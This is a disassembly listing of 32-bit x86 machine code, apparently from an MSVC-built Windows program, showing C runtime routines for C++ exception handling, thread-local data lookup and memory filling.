  402423:	f6 01 10             	testb  $0x10,(%ecx)
  402426:	74 19                	je     0x402441
  402428:	8b 40 18             	mov    0x18(%eax),%eax
  40242b:	8b 08                	mov    (%eax),%ecx
  40242d:	85 c9                	test   %ecx,%ecx
  40242f:	74 10                	je     0x402441
  402431:	8b 01                	mov    (%ecx),%eax
  402433:	51                   	push   %ecx
  402434:	8b 70 08             	mov    0x8(%eax),%esi
  402437:	8b ce                	mov    %esi,%ecx
  402439:	ff 15 3c d1 40 00    	call   *0x40d13c
  40243f:	ff d6                	call   *%esi
  402441:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402444:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40244b:	59                   	pop    %ecx
  40244c:	5f                   	pop    %edi
  40244d:	5e                   	pop    %esi
  40244e:	5b                   	pop    %ebx
  40244f:	c9                   	leave
  402450:	c3                   	ret
  402451:	55                   	push   %ebp
  402452:	8b ec                	mov    %esp,%ebp
  402454:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402457:	ff 55 0c             	call   *0xc(%ebp)
  40245a:	5d                   	pop    %ebp
  40245b:	c2 08 00             	ret    $0x8
  40245e:	55                   	push   %ebp
  40245f:	8b ec                	mov    %esp,%ebp
  402461:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  402465:	74 32                	je     0x402499
  402467:	56                   	push   %esi
  402468:	57                   	push   %edi
  402469:	8b 7d 08             	mov    0x8(%ebp),%edi
  40246c:	8b 37                	mov    (%edi),%esi
  40246e:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  402474:	75 21                	jne    0x402497
  402476:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  40247a:	75 1b                	jne    0x402497
  40247c:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  402483:	74 18                	je     0x40249d
  402485:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  40248c:	74 0f                	je     0x40249d
  40248e:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  402495:	74 06                	je     0x40249d
  402497:	5f                   	pop    %edi
  402498:	5e                   	pop    %esi
  402499:	33 c0                	xor    %eax,%eax
  40249b:	5d                   	pop    %ebp
  40249c:	c3                   	ret
  40249d:	e8 44 02 00 00       	call   0x4026e6
  4024a2:	89 70 10             	mov    %esi,0x10(%eax)
  4024a5:	8b 77 04             	mov    0x4(%edi),%esi
  4024a8:	e8 39 02 00 00       	call   0x4026e6
  4024ad:	89 70 14             	mov    %esi,0x14(%eax)
  4024b0:	e8 d4 2d 00 00       	call   0x405289
  4024b5:	cc                   	int3
  4024b6:	55                   	push   %ebp
  4024b7:	8b ec                	mov    %esp,%ebp
  4024b9:	e8 28 02 00 00       	call   0x4026e6
  4024be:	8b 40 24             	mov    0x24(%eax),%eax
  4024c1:	85 c0                	test   %eax,%eax
  4024c3:	74 0e                	je     0x4024d3
  4024c5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4024c8:	39 08                	cmp    %ecx,(%eax)
  4024ca:	74 0c                	je     0x4024d8
  4024cc:	8b 40 04             	mov    0x4(%eax),%eax
  4024cf:	85 c0                	test   %eax,%eax
  4024d1:	75 f5                	jne    0x4024c8
  4024d3:	33 c0                	xor    %eax,%eax
  4024d5:	40                   	inc    %eax
  4024d6:	5d                   	pop    %ebp
  4024d7:	c3                   	ret
  4024d8:	33 c0                	xor    %eax,%eax
  4024da:	5d                   	pop    %ebp
  4024db:	c3                   	ret
  4024dc:	55                   	push   %ebp
  4024dd:	8b ec                	mov    %esp,%ebp
  4024df:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4024e2:	8b 55 08             	mov    0x8(%ebp),%edx
  4024e5:	56                   	push   %esi
  4024e6:	8b 01                	mov    (%ecx),%eax
  4024e8:	8b 71 04             	mov    0x4(%ecx),%esi
  4024eb:	03 c2                	add    %edx,%eax
  4024ed:	85 f6                	test   %esi,%esi
  4024ef:	78 0d                	js     0x4024fe
  4024f1:	8b 49 08             	mov    0x8(%ecx),%ecx
  4024f4:	8b 14 16             	mov    (%esi,%edx,1),%edx
  4024f7:	8b 0c 0a             	mov    (%edx,%ecx,1),%ecx
  4024fa:	03 ce                	add    %esi,%ecx
  4024fc:	03 c1                	add    %ecx,%eax
  4024fe:	5e                   	pop    %esi
  4024ff:	5d                   	pop    %ebp
  402500:	c3                   	ret
  402501:	55                   	push   %ebp
  402502:	8b ec                	mov    %esp,%ebp
  402504:	56                   	push   %esi
  402505:	8b 75 08             	mov    0x8(%ebp),%esi
  402508:	57                   	push   %edi
  402509:	8b 3e                	mov    (%esi),%edi
  40250b:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%edi)
  402511:	74 12                	je     0x402525
  402513:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%edi)
  402519:	74 0a                	je     0x402525
  40251b:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%edi)
  402521:	74 1b                	je     0x40253e
  402523:	eb 13                	jmp    0x402538
  402525:	e8 bc 01 00 00       	call   0x4026e6
  40252a:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  40252e:	7e 08                	jle    0x402538
  402530:	e8 b1 01 00 00       	call   0x4026e6
  402535:	ff 48 18             	decl   0x18(%eax)
  402538:	5f                   	pop    %edi
  402539:	33 c0                	xor    %eax,%eax
  40253b:	5e                   	pop    %esi
  40253c:	5d                   	pop    %ebp
  40253d:	c3                   	ret
  40253e:	e8 a3 01 00 00       	call   0x4026e6
  402543:	89 78 10             	mov    %edi,0x10(%eax)
  402546:	8b 76 04             	mov    0x4(%esi),%esi
  402549:	e8 98 01 00 00       	call   0x4026e6
  40254e:	89 70 14             	mov    %esi,0x14(%eax)
  402551:	e8 33 2d 00 00       	call   0x405289
  402556:	cc                   	int3
  402557:	e8 8a 01 00 00       	call   0x4026e6
  40255c:	83 c0 10             	add    $0x10,%eax
  40255f:	c3                   	ret
  402560:	e8 81 01 00 00       	call   0x4026e6
  402565:	83 c0 14             	add    $0x14,%eax
  402568:	c3                   	ret
  402569:	cc                   	int3
  40256a:	cc                   	int3
  40256b:	cc                   	int3
  40256c:	cc                   	int3
  40256d:	cc                   	int3
  40256e:	cc                   	int3
  40256f:	cc                   	int3
  402570:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  402574:	0f b6 44 24 08       	movzbl 0x8(%esp),%eax
  402579:	8b d7                	mov    %edi,%edx
  40257b:	8b 7c 24 04          	mov    0x4(%esp),%edi
  40257f:	85 c9                	test   %ecx,%ecx
  402581:	0f 84 3c 01 00 00    	je     0x4026c3
  402587:	69 c0 01 01 01 01    	imul   $0x1010101,%eax,%eax
  40258d:	83 f9 20             	cmp    $0x20,%ecx
  402590:	0f 86 df 00 00 00    	jbe    0x402675
  402596:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  40259c:	0f 82 8b 00 00 00    	jb     0x40262d
  4025a2:	0f ba 25 38 4b 41 00 	btl    $0x1,0x414b38
  4025a9:	01 
  4025aa:	73 09                	jae    0x4025b5
  4025ac:	f3 aa                	rep stos %al,%es:(%edi)
  4025ae:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025b2:	8b fa                	mov    %edx,%edi
  4025b4:	c3                   	ret
  4025b5:	0f ba 25 10 40 41 00 	btl    $0x1,0x414010
  4025bc:	01 
  4025bd:	0f 83 b2 00 00 00    	jae    0x402675
  4025c3:	66 0f 6e c0          	movd   %eax,%xmm0
  4025c7:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  4025cc:	03 cf                	add    %edi,%ecx
  4025ce:	0f 11 07             	movups %xmm0,(%edi)
  4025d1:	83 c7 10             	add    $0x10,%edi
  4025d4:	83 e7 f0             	and    $0xfffffff0,%edi
  4025d7:	2b cf                	sub    %edi,%ecx
  4025d9:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  4025df:	76 4c                	jbe    0x40262d
  4025e1:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4025e8:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4025ef:	90                   	nop
  4025f0:	66 0f 7f 07          	movdqa %xmm0,(%edi)
  4025f4:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
  4025f9:	66 0f 7f 47 20       	movdqa %xmm0,0x20(%edi)
  4025fe:	66 0f 7f 47 30       	movdqa %xmm0,0x30(%edi)
  402603:	66 0f 7f 47 40       	movdqa %xmm0,0x40(%edi)
  402608:	66 0f 7f 47 50       	movdqa %xmm0,0x50(%edi)
  40260d:	66 0f 7f 47 60       	movdqa %xmm0,0x60(%edi)
  402612:	66 0f 7f 47 70       	movdqa %xmm0,0x70(%edi)
  402617:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40261d:	81 e9 80 00 00 00    	sub    $0x80,%ecx
  402623:	f7 c1 00 ff ff ff    	test   $0xffffff00,%ecx
  402629:	75 c5                	jne    0x4025f0
  40262b:	eb 13                	jmp    0x402640
  40262d:	0f ba 25 10 40 41 00 	btl    $0x1,0x414010
  402634:	01 
  402635:	73 3e                	jae    0x402675
  402637:	66 0f 6e c0          	movd   %eax,%xmm0
  40263b:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
  402640:	83 f9 20             	cmp    $0x20,%ecx
  402643:	72 1c                	jb     0x402661
  402645:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  402649:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  40264e:	83 c7 20             	add    $0x20,%edi
  402651:	83 e9 20             	sub    $0x20,%ecx
  402654:	83 f9 20             	cmp    $0x20,%ecx
  402657:	73 ec                	jae    0x402645
  402659:	f7 c1 1f 00 00 00    	test   $0x1f,%ecx
  40265f:	74 62                	je     0x4026c3
  402661:	8d 7c 0f e0          	lea    -0x20(%edi,%ecx,1),%edi
  402665:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  402669:	f3 0f 7f 47 10       	movdqu %xmm0,0x10(%edi)
  40266e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402672:	8b fa                	mov    %edx,%edi
  402674:	c3                   	ret
  402675:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40267b:	74 0e                	je     0x40268b
  40267d:	88 07                	mov    %al,(%edi)
  40267f:	47                   	inc    %edi
  402680:	83 e9 01             	sub    $0x1,%ecx
  402683:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  402689:	75 f2                	jne    0x40267d
  40268b:	f7 c1 04 00 00 00    	test   $0x4,%ecx
  402691:	74 08                	je     0x40269b
  402693:	89 07                	mov    %eax,(%edi)
  402695:	83 c7 04             	add    $0x4,%edi
  402698:	83 e9 04             	sub    $0x4,%ecx
  40269b:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  4026a1:	74 20                	je     0x4026c3
  4026a3:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4026aa:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  4026b0:	89 07                	mov    %eax,(%edi)
  4026b2:	89 47 04             	mov    %eax,0x4(%edi)
  4026b5:	83 c7 08             	add    $0x8,%edi
  4026b8:	83 e9 08             	sub    $0x8,%ecx
  4026bb:	f7 c1 f8 ff ff ff    	test   $0xfffffff8,%ecx
  4026c1:	75 ed                	jne    0x4026b0
  4026c3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026c7:	8b fa                	mov    %edx,%edi
  4026c9:	c3                   	ret
  4026ca:	55                   	push   %ebp
  4026cb:	8b ec                	mov    %esp,%ebp
  4026cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4026d0:	85 c0                	test   %eax,%eax
  4026d2:	74 0e                	je     0x4026e2
  4026d4:	3d 40 4b 41 00       	cmp    $0x414b40,%eax
  4026d9:	74 07                	je     0x4026e2
  4026db:	50                   	push   %eax
  4026dc:	e8 27 2c 00 00       	call   0x405308
  4026e1:	59                   	pop    %ecx
  4026e2:	5d                   	pop    %ebp
  4026e3:	c2 04 00             	ret    $0x4
  4026e6:	e8 09 00 00 00       	call   0x4026f4
  4026eb:	85 c0                	test   %eax,%eax
  4026ed:	0f 84 d2 2b 00 00    	je     0x4052c5
  4026f3:	c3                   	ret
  4026f4:	83 3d 20 40 41 00 ff 	cmpl   $0xffffffff,0x414020
  4026fb:	75 03                	jne    0x402700
  4026fd:	33 c0                	xor    %eax,%eax
  4026ff:	c3                   	ret
  402700:	53                   	push   %ebx
  402701:	57                   	push   %edi
  402702:	ff 15 74 d0 40 00    	call   *0x40d074
  402708:	ff 35 20 40 41 00    	push   0x414020
  40270e:	8b f8                	mov    %eax,%edi
  402710:	e8 1e 12 00 00       	call   0x403933
  402715:	8b d8                	mov    %eax,%ebx
  402717:	59                   	pop    %ecx
  402718:	83 fb ff             	cmp    $0xffffffff,%ebx
  40271b:	74 17                	je     0x402734
  40271d:	85 db                	test   %ebx,%ebx
  40271f:	75 59                	jne    0x40277a
  402721:	6a ff                	push   $0xffffffff
  402723:	ff 35 20 40 41 00    	push   0x414020
  402729:	e8 40 12 00 00       	call   0x40396e
  40272e:	59                   	pop    %ecx
  40272f:	59                   	pop    %ecx
  402730:	85 c0                	test   %eax,%eax
  402732:	75 04                	jne    0x402738
  402734:	33 db                	xor    %ebx,%ebx
  402736:	eb 42                	jmp    0x40277a
  402738:	56                   	push   %esi
  402739:	6a 28                	push   $0x28
  40273b:	6a 01                	push   $0x1
  40273d:	e8 30 2c 00 00       	call   0x405372
  402742:	8b f0                	mov    %eax,%esi
  402744:	59                   	pop    %ecx
  402745:	59                   	pop    %ecx
  402746:	85 f6                	test   %esi,%esi
  402748:	74 12                	je     0x40275c
  40274a:	56                   	push   %esi
  40274b:	ff 35 20 40 41 00    	push   0x414020
  402751:	e8 18 12 00 00       	call   0x40396e
  402756:	59                   	pop    %ecx
  402757:	59                   	pop    %ecx
  402758:	85 c0                	test   %eax,%eax
  40275a:	75 12                	jne    0x40276e
  40275c:	33 db                	xor    %ebx,%ebx
  40275e:	53                   	push   %ebx
  40275f:	ff 35 20 40 41 00    	push   0x414020
  402765:	e8 04 12 00 00       	call   0x40396e
  40276a:	59                   	pop    %ecx
  40276b:	59                   	pop    %ecx
  40276c:	eb 04                	jmp    0x402772
  40276e:	8b de                	mov    %esi,%ebx
  402770:	33 f6                	xor    %esi,%esi
  402772:	56                   	push   %esi
  402773:	e8 90 2b 00 00       	call   0x405308
  402778:	59                   	pop    %ecx
  402779:	5e                   	pop    %esi
  40277a:	57                   	push   %edi
  40277b:	ff 15 78 d0 40 00    	call   *0x40d078
  402781:	5f                   	pop    %edi
  402782:	8b c3                	mov    %ebx,%eax
  402784:	5b                   	pop    %ebx
  402785:	c3                   	ret
  402786:	68 ca 26 40 00       	push   $0x4026ca
  40278b:	e8 2d 11 00 00       	call   0x4038bd
  402790:	a3 20 40 41 00       	mov    %eax,0x414020
  402795:	59                   	pop    %ecx
  402796:	83 f8 ff             	cmp    $0xffffffff,%eax
  402799:	75 03                	jne    0x40279e
  40279b:	32 c0                	xor    %al,%al
  40279d:	c3                   	ret
  40279e:	68 40 4b 41 00       	push   $0x414b40
  4027a3:	50                   	push   %eax
  4027a4:	e8 c5 11 00 00       	call   0x40396e
  4027a9:	59                   	pop    %ecx
  4027aa:	59                   	pop    %ecx
  4027ab:	85 c0                	test   %eax,%eax
  4027ad:	75 07                	jne    0x4027b6
  4027af:	e8 05 00 00 00       	call   0x4027b9
  4027b4:	eb e5                	jmp    0x40279b
  4027b6:	b0 01                	mov    $0x1,%al
  4027b8:	c3                   	ret
  4027b9:	a1 20 40 41 00       	mov    0x414020,%eax
  4027be:	83 f8 ff             	cmp    $0xffffffff,%eax
  4027c1:	74 0e                	je     0x4027d1
  4027c3:	50                   	push   %eax
  4027c4:	e8 2f 11 00 00       	call   0x4038f8
  4027c9:	83 0d 20 40 41 00 ff 	orl    $0xffffffff,0x414020
  4027d0:	59                   	pop    %ecx
  4027d1:	b0 01                	mov    $0x1,%al
  4027d3:	c3                   	ret
  4027d4:	6a 10                	push   $0x10
  4027d6:	68 08 26 41 00       	push   $0x412608
  4027db:	e8 c0 f3 ff ff       	call   0x401ba0
  4027e0:	33 db                	xor    %ebx,%ebx
  4027e2:	8b 45 10             	mov    0x10(%ebp),%eax
  4027e5:	8b 48 04             	mov    0x4(%eax),%ecx
  4027e8:	85 c9                	test   %ecx,%ecx
  4027ea:	0f 84 0a 01 00 00    	je     0x4028fa
  4027f0:	38 59 08             	cmp    %bl,0x8(%ecx)
  4027f3:	0f 84 01 01 00 00    	je     0x4028fa
  4027f9:	8b 50 08             	mov    0x8(%eax),%edx
  4027fc:	85 d2                	test   %edx,%edx
  4027fe:	75 08                	jne    0x402808
  402800:	39 18                	cmp    %ebx,(%eax)
  402802:	0f 8d f2 00 00 00    	jge    0x4028fa
  402808:	8b 08                	mov    (%eax),%ecx
  40280a:	8b 75 0c             	mov    0xc(%ebp),%esi
  40280d:	85 c9                	test   %ecx,%ecx
  40280f:	78 05                	js     0x402816
  402811:	83 c6 0c             	add    $0xc,%esi
  402814:	03 f2                	add    %edx,%esi
  402816:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402819:	8b 7d 14             	mov    0x14(%ebp),%edi
  40281c:	84 c9                	test   %cl,%cl
  40281e:	79 20                	jns    0x402840
  402820:	f6 07 10             	testb  $0x10,(%edi)
  402823:	74 1b                	je     0x402840
  402825:	a1 3c 4b 41 00       	mov    0x414b3c,%eax
  40282a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40282d:	85 c0                	test   %eax,%eax
  40282f:	74 0f                	je     0x402840
  402831:	8b c8                	mov    %eax,%ecx
  402833:	ff 15 3c d1 40 00    	call   *0x40d13c
  402839:	ff 55 e4             	call   *-0x1c(%ebp)
  40283c:	8b c8                	mov    %eax,%ecx
  40283e:	eb 0b                	jmp    0x40284b
  402840:	8b 45 08             	mov    0x8(%ebp),%eax
  402843:	f6 c1 08             	test   $0x8,%cl
  402846:	74 1c                	je     0x402864
  402848:	8b 48 18             	mov    0x18(%eax),%ecx
  40284b:	85 c9                	test   %ecx,%ecx
  40284d:	0f 84 b9 00 00 00    	je     0x40290c
  402853:	85 f6                	test   %esi,%esi
  402855:	0f 84 b1 00 00 00    	je     0x40290c
  40285b:	89 0e                	mov    %ecx,(%esi)
  40285d:	8d 47 08             	lea    0x8(%edi),%eax
  402860:	50                   	push   %eax
  402861:	51                   	push   %ecx
  402862:	eb 37                	jmp    0x40289b
  402864:	f6 07 01             	testb  $0x1,(%edi)
  402867:	74 3d                	je     0x4028a6
  402869:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  40286d:	0f 84 99 00 00 00    	je     0x40290c
  402873:	85 f6                	test   %esi,%esi
  402875:	0f 84 91 00 00 00    	je     0x40290c
  40287b:	ff 77 14             	push   0x14(%edi)
  40287e:	ff 70 18             	push   0x18(%eax)
  402881:	56                   	push   %esi
  402882:	e8 a9 12 00 00       	call   0x403b30
  402887:	83 c4 0c             	add    $0xc,%esp
  40288a:	83 7f 14 04          	cmpl   $0x4,0x14(%edi)
  40288e:	75 56                	jne    0x4028e6
  402890:	83 3e 00             	cmpl   $0x0,(%esi)
  402893:	74 51                	je     0x4028e6
  402895:	8d 47 08             	lea    0x8(%edi),%eax
  402898:	50                   	push   %eax
  402899:	ff 36                	push   (%esi)
  40289b:	e8 3c fc ff ff       	call   0x4024dc
  4028a0:	59                   	pop    %ecx
  4028a1:	59                   	pop    %ecx
  4028a2:	89 06                	mov    %eax,(%esi)
  4028a4:	eb 40                	jmp    0x4028e6
  4028a6:	8b 48 18             	mov    0x18(%eax),%ecx
  4028a9:	39 5f 18             	cmp    %ebx,0x18(%edi)
  4028ac:	75 23                	jne    0x4028d1
  4028ae:	85 c9                	test   %ecx,%ecx
  4028b0:	74 5a                	je     0x40290c
  4028b2:	85 f6                	test   %esi,%esi
  4028b4:	74 56                	je     0x40290c
  4028b6:	ff 77 14             	push   0x14(%edi)
  4028b9:	8d 47 08             	lea    0x8(%edi),%eax
  4028bc:	50                   	push   %eax
  4028bd:	51                   	push   %ecx
  4028be:	e8 19 fc ff ff       	call   0x4024dc
  4028c3:	59                   	pop    %ecx
  4028c4:	59                   	pop    %ecx
  4028c5:	50                   	push   %eax
  4028c6:	56                   	push   %esi
  4028c7:	e8 64 12 00 00       	call   0x403b30
  4028cc:	83 c4 0c             	add    $0xc,%esp
  4028cf:	eb 15                	jmp    0x4028e6
  4028d1:	85 c9                	test   %ecx,%ecx
  4028d3:	74 37                	je     0x40290c
  4028d5:	85 f6                	test   %esi,%esi
  4028d7:	74 33                	je     0x40290c
  4028d9:	f6 07 04             	testb  $0x4,(%edi)
  4028dc:	6a 00                	push   $0x0
  4028de:	5b                   	pop    %ebx
  4028df:	0f 95 c3             	setne  %bl
  4028e2:	43                   	inc    %ebx
  4028e3:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4028e6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4028ed:	8b c3                	mov    %ebx,%eax
  4028ef:	eb 0b                	jmp    0x4028fc
  4028f1:	33 c0                	xor    %eax,%eax
  4028f3:	40                   	inc    %eax
  4028f4:	c3                   	ret
  4028f5:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4028f8:	eb 12                	jmp    0x40290c
  4028fa:	33 c0                	xor    %eax,%eax
  4028fc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4028ff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402906:	59                   	pop    %ecx
  402907:	5f                   	pop    %edi
  402908:	5e                   	pop    %esi
  402909:	5b                   	pop    %ebx
  40290a:	c9                   	leave
  40290b:	c3                   	ret
  40290c:	e8 b4 29 00 00       	call   0x4052c5
  402911:	cc                   	int3
  402912:	6a 08                	push   $0x8
  402914:	68 28 26 41 00       	push   $0x412628
  402919:	e8 82 f2 ff ff       	call   0x401ba0
  40291e:	8b 55 10             	mov    0x10(%ebp),%edx
  402921:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402924:	83 3a 00             	cmpl   $0x0,(%edx)
  402927:	7d 04                	jge    0x40292d
  402929:	8b f9                	mov    %ecx,%edi
  40292b:	eb 06                	jmp    0x402933
  40292d:	8d 79 0c             	lea    0xc(%ecx),%edi
  402930:	03 7a 08             	add    0x8(%edx),%edi
  402933:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402937:	8b 75 14             	mov    0x14(%ebp),%esi
  40293a:	56                   	push   %esi
  40293b:	52                   	push   %edx
  40293c:	51                   	push   %ecx
  40293d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402940:	53                   	push   %ebx
  402941:	e8 8e fe ff ff       	call   0x4027d4
  402946:	83 c4 10             	add    $0x10,%esp
  402949:	83 e8 01             	sub    $0x1,%eax
  40294c:	74 21                	je     0x40296f
  40294e:	83 e8 01             	sub    $0x1,%eax
  402951:	75 34                	jne    0x402987
  402953:	8d 46 08             	lea    0x8(%esi),%eax
  402956:	50                   	push   %eax
  402957:	ff 73 18             	push   0x18(%ebx)
  40295a:	e8 7d fb ff ff       	call   0x4024dc
  40295f:	59                   	pop    %ecx
  402960:	59                   	pop    %ecx
  402961:	6a 01                	push   $0x1
  402963:	50                   	push   %eax
  402964:	ff 76 18             	push   0x18(%esi)
  402967:	57                   	push   %edi
  402968:	e8 e7 0b 00 00       	call   0x403554
  40296d:	eb 18                	jmp    0x402987
  40296f:	8d 46 08             	lea    0x8(%esi),%eax
  402972:	50                   	push   %eax
  402973:	ff 73 18             	push   0x18(%ebx)
  402976:	e8 61 fb ff ff       	call   0x4024dc
  40297b:	59                   	pop    %ecx
  40297c:	59                   	pop    %ecx
  40297d:	50                   	push   %eax
  40297e:	ff 76 18             	push   0x18(%esi)
  402981:	57                   	push   %edi
  402982:	e8 bd 0b 00 00       	call   0x403544
  402987:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40298e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  402991:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402998:	59                   	pop    %ecx
  402999:	5f                   	pop    %edi
  40299a:	5e                   	pop    %esi
  40299b:	5b                   	pop    %ebx
  40299c:	c9                   	leave
  40299d:	c3                   	ret
  40299e:	33 c0                	xor    %eax,%eax
  4029a0:	40                   	inc    %eax
  4029a1:	c3                   	ret
  4029a2:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4029a5:	e8 1b 29 00 00       	call   0x4052c5
  4029aa:	cc                   	int3
  4029ab:	55                   	push   %ebp
  4029ac:	8b ec                	mov    %esp,%ebp
  4029ae:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  4029b2:	53                   	push   %ebx
  4029b3:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  4029b6:	56                   	push   %esi
  4029b7:	57                   	push   %edi
  4029b8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4029bb:	74 10                	je     0x4029cd
  4029bd:	ff 75 20             	push   0x20(%ebp)
  4029c0:	53                   	push   %ebx
  4029c1:	57                   	push   %edi
  4029c2:	ff 75 08             	push   0x8(%ebp)
  4029c5:	e8 48 ff ff ff       	call   0x402912
  4029ca:	83 c4 10             	add    $0x10,%esp
  4029cd:	8b 45 2c             	mov    0x2c(%ebp),%eax
  4029d0:	85 c0                	test   %eax,%eax
  4029d2:	75 02                	jne    0x4029d6
  4029d4:	8b c7                	mov    %edi,%eax
  4029d6:	ff 75 08             	push   0x8(%ebp)
  4029d9:	50                   	push   %eax
  4029da:	e8 fb f5 ff ff       	call   0x401fda
  4029df:	8b 75 24             	mov    0x24(%ebp),%esi
  4029e2:	ff 36                	push   (%esi)
  4029e4:	ff 75 18             	push   0x18(%ebp)
  4029e7:	ff 75 14             	push   0x14(%ebp)
  4029ea:	57                   	push   %edi
  4029eb:	e8 d2 09 00 00       	call   0x4033c2
  4029f0:	8b 46 04             	mov    0x4(%esi),%eax
  4029f3:	40                   	inc    %eax
  4029f4:	50                   	push   %eax
  4029f5:	ff 75 18             	push   0x18(%ebp)
  4029f8:	57                   	push   %edi
  4029f9:	e8 2f 10 00 00       	call   0x403a2d
  4029fe:	68 00 01 00 00       	push   $0x100
  402a03:	ff 75 28             	push   0x28(%ebp)
  402a06:	ff 73 0c             	push   0xc(%ebx)
  402a09:	ff 75 18             	push   0x18(%ebp)
  402a0c:	ff 75 10             	push   0x10(%ebp)
  402a0f:	57                   	push   %edi
  402a10:	ff 75 08             	push   0x8(%ebp)
  402a13:	e8 3a 07 00 00       	call   0x403152
  402a18:	83 c4 38             	add    $0x38,%esp
  402a1b:	85 c0                	test   %eax,%eax
  402a1d:	74 07                	je     0x402a26
  402a1f:	57                   	push   %edi
  402a20:	50                   	push   %eax
  402a21:	e8 81 f5 ff ff       	call   0x401fa7
  402a26:	5f                   	pop    %edi
  402a27:	5e                   	pop    %esi
  402a28:	5b                   	pop    %ebx
  402a29:	5d                   	pop    %ebp
  402a2a:	c3                   	ret
  402a2b:	55                   	push   %ebp
  402a2c:	8b ec                	mov    %esp,%ebp
  402a2e:	83 ec 64             	sub    $0x64,%esp
  402a31:	53                   	push   %ebx
  402a32:	56                   	push   %esi
  402a33:	57                   	push   %edi
  402a34:	8b 7d 18             	mov    0x18(%ebp),%edi
  402a37:	33 c0                	xor    %eax,%eax
  402a39:	57                   	push   %edi
  402a3a:	ff 75 14             	push   0x14(%ebp)
  402a3d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402a40:	ff 75 0c             	push   0xc(%ebp)
  402a43:	88 45 e8             	mov    %al,-0x18(%ebp)
  402a46:	e8 c5 0f 00 00       	call   0x403a10
  402a4b:	8b c8                	mov    %eax,%ecx
  402a4d:	83 c4 0c             	add    $0xc,%esp
  402a50:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402a53:	83 f9 ff             	cmp    $0xffffffff,%ecx
  402a56:	0f 8c 6e 03 00 00    	jl     0x402dca
  402a5c:	3b 4f 04             	cmp    0x4(%edi),%ecx
  402a5f:	0f 8d 65 03 00 00    	jge    0x402dca
  402a65:	8b 5d 08             	mov    0x8(%ebp),%ebx
  402a68:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  402a6e:	0f 85 f7 00 00 00    	jne    0x402b6b
  402a74:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  402a78:	0f 85 ed 00 00 00    	jne    0x402b6b
  402a7e:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  402a85:	74 16                	je     0x402a9d
  402a87:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  402a8e:	74 0d                	je     0x402a9d
  402a90:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  402a97:	0f 85 ce 00 00 00    	jne    0x402b6b
  402a9d:	33 f6                	xor    %esi,%esi
  402a9f:	39 73 1c             	cmp    %esi,0x1c(%ebx)
  402aa2:	0f 85 c3 00 00 00    	jne    0x402b6b
  402aa8:	e8 39 fc ff ff       	call   0x4026e6
  402aad:	39 70 10             	cmp    %esi,0x10(%eax)
  402ab0:	0f 84 ae 02 00 00    	je     0x402d64
  402ab6:	e8 2b fc ff ff       	call   0x4026e6
  402abb:	8b 58 10             	mov    0x10(%eax),%ebx
  402abe:	e8 23 fc ff ff       	call   0x4026e6
  402ac3:	c6 45 e8 01          	movb   $0x1,-0x18(%ebp)
  402ac7:	8b 40 14             	mov    0x14(%eax),%eax
  402aca:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402acd:	85 db                	test   %ebx,%ebx
  402acf:	0f 84 f5 02 00 00    	je     0x402dca
